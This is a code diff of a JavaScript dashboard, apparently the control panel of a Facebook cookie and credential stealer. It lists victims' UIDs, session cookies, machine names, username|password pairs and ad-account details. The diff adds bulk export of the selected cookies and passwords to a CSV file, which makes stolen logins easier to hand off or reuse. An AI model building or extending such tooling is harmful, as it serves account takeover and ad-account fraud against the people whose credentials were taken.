@@ -57,7 +57,7 @@ function setListCookies(res){
             <td>${element['id']}</td>
             <td class="pl-0">
             <div class="d-flex align-items-center">
-                <a style="color: ${element['existed'] ? 'red' : '#007bff'};" href="https://facebook.com/${element['uid']}" class="name">${element['uid']}</a>
+                <a style="color: ${element['existed'] ? 'red' : '#007bff'};" href="https://facebook.com/${element['uid']}" id="value-uid${count}" class="name">${element['uid']}</a>
             </div>
             </td>
             <td>${element['machine']}</td>
@@ -67,7 +67,7 @@ function setListCookies(res){
                     <textarea class="form-control" id="value-cookie${count}" rows="3">${element['cookie']}</textarea>
                 </div>
             </td>
-            <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
+            <td><p class="text-break" id="value-usernameAndPassword${count}">${element['usernameAndPassword']}</p></td>`;
             // <td><button onclick='CreateTextFile("${element['uid']}","${element['usernameAndPassword'] ? element['usernameAndPassword'] : null}",this)' class="btn btn-warning w-20 ml-3 confirm-button">Download</button></td>`;
             if(infoAds!=null){
                 htmlSegment+= `<td>${infoAds['adsName']}<br>(${infoAds['adsId']})</td>
@@ -191,8 +191,8 @@ function setListCookies(res){
         if(listCookies.length>0){
             if(confirm("Xác nhận tải những mục đã chọn?")){
     
-                ///
-                var saveCookies = "";
+                /// save to text 
+                /*var saveCookies = "";
                 indexDelete.forEach(element=>{
                     saveCookies+=document.getElementById(`value-cookie${element}`).value+"\n";
                 });
@@ -201,7 +201,32 @@ function setListCookies(res){
                 type: "text/plain;charset=utf-8",
                 });
                 
-                saveAs(blob, `${new Date()}.txt`);
+                saveAs(blob, `${new Date()}.txt`);*/
+
+
+                var listCookiesSave = new Array();
+                listCookiesSave.push(['UID','Cookie','Username','Password']);
+                indexDelete.forEach(element=>{
+                    var userAndPass = document.getElementById(`value-usernameAndPassword${element}`).innerText;
+                    var listUserAndPass = userAndPass.split(' ');
+                    listCookiesSave.push([document.getElementById(`value-uid${element}`).innerText,document.getElementById(`value-cookie${element}`).value,'','']);
+                    listUserAndPass.forEach(e=>{
+                        try{
+                            var user = e.split('|')[0];
+                            var pass = e.split('|')[1];
+                            listCookiesSave.push(['','',user,pass]);
+                        }
+                        catch(e){
+
+                        }
+                        
+                    })
+                    
+                });
+                console.log(listCookiesSave)
+                // downloadBlobCsv(listCookiesSave, 'exporta.csv', 'text/csv;charset=utf-8;')
+                exportToCsv( `${new Date()}.csv`,listCookiesSave)
+
     
     
     
@@ -398,6 +423,115 @@ function eventNextPage(){
         }
     }
 }
+//////////////////////////// create file excel ///////////////
+function arrayToCsv(data){
+    return data.map(row =>
+      row
+      .map(String)  // convert every value to String
+      .map(v => v.replaceAll('"', '""'))  // escape double colons
+      .map(v => `"${v}"`)  // quote it
+      .join(',')  // comma-separated
+    ).join('\r\n');  // rows starting on new lines
+}
+// function convertToCsv(fName, rows) {
+//     var csv = '';
+//     for (var i = 0; i < rows.length; i++) {
+//         var row = rows[i];
+//         for (var j = 0; j < row.length; j++) {
+//             var val = row[j] === null ? '' : row[j].toString();
+//             val = val.replace(/\t/gi, " ");
+//             if (j > 0)
+//                 csv += '\t';
+//             csv += val;
+//         }
+//         csv += '\n';
+//     }
+
+//     // for UTF-16
+//     var cCode, bArr = [];
+//     bArr.push(255, 254);
+//     for (var i = 0; i < csv.length; ++i) {
+//         cCode = csv.charCodeAt(i);
+//         bArr.push(cCode & 0xff);
+//         bArr.push(cCode / 256 >>> 0);
+//     }
+
+//     var blob = new Blob([new Uint8Array(bArr)], { type: 'text/csv;charset=UTF-16LE;' });
+//     if (navigator.msSaveBlob) {
+//         navigator.msSaveBlob(blob, fName);
+//     } else {
+//         var link = document.createElement("a");
+//         if (link.download !== undefined) {
+//             var url = window.URL.createObjectURL(blob);
+//             link.setAttribute("href", url);
+//             link.setAttribute("download", fName);
+//             link.style.visibility = 'hidden';
+//             document.body.appendChild(link);
+//             link.click();
+//             document.body.removeChild(link);
+//             window.URL.revokeObjectURL(url);
+//         }
+//     }
+// }
+function exportToCsv(filename, rows) {
+    var processRow = function (row) {
+        var finalVal = '';
+        for (var j = 0; j < row.length; j++) {
+            try{
+                var innerValue = row[j] === null ? '' : row[j].toString();
+                if (row[j] instanceof Date) {
+                    innerValue = row[j].toLocaleString();
+                };
+                var result = innerValue.replace(/"/g, '""');
+                if (result.search(/("|,|\n)/g) >= 0)
+                    result = '"' + result + '"';
+                if (j > 0)
+                    finalVal += ',';
+                finalVal += result;
+            }
+            catch(e){
+
+            }
+            
+        }
+        return finalVal + '\n';
+    };
+
+    var csvFile = '';
+    for (var i = 0; i < rows.length; i++) {
+        csvFile += processRow(rows[i]);
+    }
+
+    var blob = new Blob([csvFile], { type: 'text/csv;charset=utf-8;' });
+    if (navigator.msSaveBlob) { // IE 10+
+        navigator.msSaveBlob(blob, filename);
+    } else {
+        var link = document.createElement("a");
+        if (link.download !== undefined) { // feature detection
+            // Browsers that support HTML5 download attribute
+            var url = URL.createObjectURL(blob);
+            link.setAttribute("href", url);
+            link.setAttribute("download", filename);
+            link.style.visibility = 'hidden';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    }
+}
+function downloadBlobCsv(content, filename, contentType) {
+    // Create a blob
+    var blob = new Blob([content], { type: contentType });
+    var url = URL.createObjectURL(blob);
+  
+    // Create a link to download it
+    var pom = document.createElement('a');
+    pom.href = url;
+    pom.setAttribute('download', filename);
+    pom.click();
+}
+
+////////////////////
 function CreateTextFile(uid,pass) {
     var names = new Array('Lukas','Sergio','Joan','Jeremiah','Abel','Jamel','Gunner',
     'Armando','Lonnie','Caryn',
